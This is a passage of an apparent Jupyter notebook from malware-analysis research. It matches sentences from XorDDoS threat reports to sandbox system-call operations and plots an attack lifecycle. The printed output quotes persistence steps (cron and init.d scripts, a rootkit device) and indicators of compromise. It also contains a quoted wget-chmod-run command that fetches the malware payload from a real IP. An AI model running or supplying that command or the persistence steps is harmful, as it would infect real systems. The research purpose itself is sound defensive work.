      "\t<OP52 act=open, obj=/var/run/>, <OP30 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP69 act=newfstatat, obj=/proc/>, <OP35 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>\n",
      "\t<OP27 act=clone, obj=^chkconfig$>, <OP27 act=install, obj=chkconfig, sent=screenshot displaying chkconfig and update-rc.d commands installing the startup service figure 16. chkconfig and update-rc.d commands install the startup service argument-based code-flow xorddos has specific code paths corresponding to the number of arguments provided to the program.>\n",
      "\n",
      "Sample Xorddos-Trendmicro.csv\n",
      "\tnum of segment in report: 27\n",
      "\tlenght of ctd's OPset is 6\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 6, num of asg objects: 26. R_malObj is 0.2308\n",
      "\t\tctd_object: {'[a-zA-z]:\\\\d{1,5}$', '/var/', '/etc/cron', '/etc/rc', '/run/', '/var/run/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 6\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 9, num of asg op: 73. R_malOps is 0.1233\n",
      "\t\trefered lifecycle: [69, 57, 55, 32, 56, 2, 48, 15, 49]\n",
      "\t\tsys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP70 act=newfstatat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP58 act=lseek, obj=/var/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP56 act=lseek, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP33 act=stat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP57 act=lseek, obj=/var/run/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP 3 act=stat64, obj=/var/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP49 act=stat64, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP 1 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>\n",
      "\t<OP50 act=stat64, obj=/var/run/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\n",
      "Sample Xorddos-Trendmicro2.csv\n",
      "\tnum of segment in report: 47\n",
      "\tlenght of ctd's OPset is 2\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 1, num of asg objects: 26. R_malObj is 0.0385\n",
      "\t\tctd_object: {'\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 2\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 2, num of asg op: 73. R_malOps is 0.0274\n",
      "\t\trefered lifecycle: [61, 63]\n",
      "\t\tsys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP62 act=send, obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>\n",
      "\t<OP64 act=_newselect, obj=ip_addr>, <OP 2 act=find, obj=http://62.171.160.189/linux_arm, sent= indicators of compromise kaiji  file name\tsha 256\ttrend micro pattern detection 123.sh\t9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8\ttrojan.sh.kaiji.a linux_arm\td315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56\tddos.linux.kaiji.a related urls:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh xorddos and other malware variants found through the same url  sha 256\ttrend micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3\tbackdoor.linux.xorddos.ae 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c\tbackdoor.linux.dofloo.ab 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe\tbackdoor.win32.sddos.a related url:  http://122.51.133.49:10086/vip>\n",
      "\n",
      "\n",
      "OperationPair that changes system resources:\n",
      " [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]\n"
     ]
    }
   ],
   "source": [
    "for sample in samples:\n",
    "    # print(len(sample.OPset)) # 30\n",
    "    # print(len(sample.OPset_ordered)) # 30\n",
    "    # print(set(sample.OPset) - set(sample.OPset_ordered)) # 相減是空的set 都OK\n",
    "    fset = run_family_set_procedure(sample)\n",
    "    # match_sentence_ttlcnt = save_match_sent_to_excel(fset, sample.samplename)\n",
    "    # print(f'match_sentence_ttlcnt is {match_sentence_ttlcnt}\\n---\\n')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw Lifecycle diagram\n",
    "- 兩個 traces (legend) 一般的 OP 和 ChangeSys OP。分兩個顏色，不重疊。\n",
    "- x: [a,a,a,a,b,b,b,c,c,c] 不同 report 的 step 可以放同一個 list，因為屬於同個 trace。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "marker": {
          "color": "darkorange",
          "size": 12
         },
         "mode": "markers",
         "name": "Normal Operation Pair",
         "type": "scatter",
         "x": [
          1,
          68,
          69,
          70,
          58,
          1,
          56,
          68,
          33,
          57,
          41,
          3,
          49,
          16,
          53,
          51,
          50,
          13,
          52,
          69,
          27,
          70,
          58,
          56,
          33,
          57,
          3,
          49,
          16,
          50,
          62,
          64,
          1,
          2,
          3,
          4,
          5,
          6,
          7,
          8,
          9,
          10,
          11,
          12,
          19,
          20,
          23,
          24,
          25,
          26,
          27,
          28,
          29,
          30,
          31,
          33,
          34,
          35,
          36,
          37,
          38,
          39,
          40,
          41,
          42,
          49,
          50,
          51,
          52,
          53,
          54,
          55,
          56,
          57,
          58,
          59,
          60,
          61,
          62,
          63,
          64,
          65,
          66,
          67,
          68,
          69,
          70,
          71,
          72,
          73
         ],
         "y": [
          "Intezer (3)",
          "Intezer (3)",
          "Intezer (3)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro2 (2)",
          "Trendmicro2 (2)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        },
        {
         "marker": {
          "color": "blue",
          "size": 12
         },
         "mode": "markers",
         "name": "Change SR Operation Pair",
         "type": "scatter",
         "x": [
          17,
          47,
          46,
          45,
          14,
          16,
          18,
          44,
          32,
          22,
          13,
          48,
          15,
          21,
          43
         ],
         "y": [
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        }
       ],
       "layout": {
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Lifecycle Diagram of Attack Behavior in Document (Xorddos)"
        },
        "xaxis": {
         "title": {
          "text": "ASG Operation Pair (in steps)"
         }
        },
        "yaxis": {
         "title": {
          "text": "Malware Document"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# import plotly.express as px\n",
    "import plotly.graph_objects as go\n",
    "\n",
    "def symmetric_difference(list1: list, list2: list) -> list:\n",
    "    ''' return list1 - list2. '''\n",
    "    s = set(list2)\n",
    "    temp3 = [x for x in list1 if x not in s]\n",
    "    return temp3\n",
    "\n",
    "def draw_lifecycle(fset:FamilySet):\n",
    "    familname = fset.familyname\n",
    "    # reportnames = [rem.reportname for rem in fset.rem_lst if len(rem.match_regex)]\n",
    "\n",
    "    fig = go.Figure()\n",
    "    x, y = [], []\n",
    "    x_sys, y_sys = [], []\n",
    "    for i, rem in enumerate(fset.rem_lst):\n",
    "        if len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "\n",
    "        numOfDot = len(rem.OPset_order_index)\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        reportname = reportname.split('-')[1]\n",
    "        if reportname == \"Ms\":\n",
    "            reportname = \"Microsoft\"\n",
    "        reportname += f' ({numOfDot})'\n",
    "        x_sys.extend(rem.SysOPset_order_index) # 改變系統環境的 OP\n",
    "        y_sys.extend([reportname] * len(rem.SysOPset_order_index))\n",
    "        current_x_normal = symmetric_difference(rem.OPset_order_index, rem.SysOPset_order_index) # 一般的/其餘的 OP\n",
    "        # print(reportname, 'numOfDot', numOfDot, 'rem.OPset_order_index', rem.OPset_order_index)\n",
    "        # print('x_normal', current_x_normal, 'x_sys', rem.SysOPset_order_index)\n",
    "        x.extend(current_x_normal)\n",
    "        y.extend([reportname] * len(current_x_normal))\n",
    "        pass\n",
    "    # todo: add baseline's lifecycle\n",
    "    print()\n",
    "    rowname = f'ASG ({len(fset.sample.OPset)})'\n",
    "    current_x_system = fset.sample.OPset_sysOnly_ordered_index\n",
    "    current_x_normal = symmetric_difference(list(range(len(fset.sample.OPset))), current_x_system) # all steps - sysobj steps\n",
    "    x_sys.extend(current_x_system)\n",
    "    y_sys.extend([rowname] * len(current_x_system)) \n",
    "    x.extend(current_x_normal)\n",
    "    y.extend([rowname] * len(current_x_normal))\n",
    "    # print(rowname, len(fset.sample.OPset), len(current_x_system), len(current_x_normal))\n",
    "    \n",
    "    # normal OPs\n",
    "    x = [idx+1 for idx in x] # add 1 to each asg index\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x,\n",
    "        y=y,\n",
    "        marker=dict(color=\"darkorange\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Normal Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    # changeSysObj OPs\n",
    "    x_sys = x = [idx+1 for idx in x_sys]\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x_sys,\n",
    "        y=y_sys,\n",
    "        marker=dict(color=\"blue\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Change SR Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    fig.update_layout(title=f\"Lifecycle Diagram of Attack Behavior in Document ({familname})\",\n",
    "                    xaxis_title=\"ASG Operation Pair (in steps)\",\n",
    "                    yaxis_title=\"Malware Document\")\n",
    "    fig.show()\n",
    "    pass\n",
    "\n",
    "draw_lifecycle(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw ASG & CTD's OP graph\n",
    "- 完整的 ASG OPset graph\n",
    "- 每篇報告的 CTD OPset (完整和matched兩種)，以及對應部分的 ASG。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['b', 'c', 'd']"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = [1,2,3]\n",
    "b = ['a','b','c','d','e']\n",
    "[b[i] for i in a]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
